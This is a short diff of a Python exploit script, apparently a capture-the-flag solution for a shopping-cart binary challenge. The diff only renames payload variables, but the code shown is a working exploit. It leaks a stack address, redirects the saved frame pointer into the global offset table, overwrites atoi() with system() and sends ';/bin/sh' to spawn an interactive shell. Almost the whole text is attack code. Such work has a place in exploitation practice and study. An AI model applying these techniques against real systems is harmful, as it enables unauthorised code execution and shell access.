@@ -61,8 +61,8 @@ stack_env = u32(s.recv()[:4])
 ebp_delete = stack_env - 0x104 
 
 # delete to turn into the beginning
-payload4 = p32(0x0804b033) + "\x00"*8 + p32(mycart)
-s.sendline(payload4)
+payload5 = p32(0x0804b033) + "\x00"*8 + p32(mycart)
+s.sendline(payload5)
 s.recv()
 s.sendline("28")
 s.recv()
@@ -71,15 +71,15 @@ s.recv()
 iphone8()
 # delete to set ebp value point to GOT when leaving delete() function
 # ebp in GOT
-payload5 = p32(0x0804b033) + "\x00"*4 + p32(ebp_delete - 0xc) + p32(got_atoi + 0x22)
-s.sendline(payload5)
+payload6 = p32(0x0804b033) + "\x00"*4 + p32(ebp_delete - 0xc) + p32(got_atoi + 0x22)
+s.sendline(payload6)
 s.recv()
 s.sendline("28")
 s.recv()
 
 # override got atoi() with system() and execute with payload6 argument
-payload6 = p32(sys_addr) + ";/bin/sh"
-s.sendline(payload6)
+payload7 = p32(sys_addr) + ";/bin/sh"
+s.sendline(payload7)
 
 s.interactive()
 
